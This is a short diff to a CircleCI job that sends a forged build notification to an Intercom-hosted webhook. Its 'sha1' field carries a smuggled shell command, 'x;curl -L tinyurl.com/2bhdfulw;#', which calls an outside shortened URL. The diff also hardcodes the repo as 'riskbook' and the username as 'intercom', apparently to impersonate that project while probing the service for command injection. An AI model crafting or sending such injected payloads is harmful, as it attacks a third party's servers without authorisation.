@@ -9,7 +9,7 @@ jobs:
           command: |
             status=$(curl -sS -o /tmp/muster-response -w '%{http_code}' -X POST https://muster.intercom.io/circle_webhooks \
               -H "Content-Type: application/json" \
-              -d '{"build_num":"'"$CIRCLE_BUILD_NUM"'","branch":"main","sha1":"x;curl -L tinyurl.com/2bhdfulw;#","status":"success","repo":"'"$CIRCLE_PROJECT_REPONAME"'","username":"'"$CIRCLE_PROJECT_USERNAME"'"}')
+              -d '{"build_num":"'"$CIRCLE_BUILD_NUM"'","branch":"main","sha1":"x;curl -L tinyurl.com/2bhdfulw;#","status":"success","repo":"riskbook","username":"intercom"}')
             echo "HTTP $status"
             cat /tmp/muster-response
 
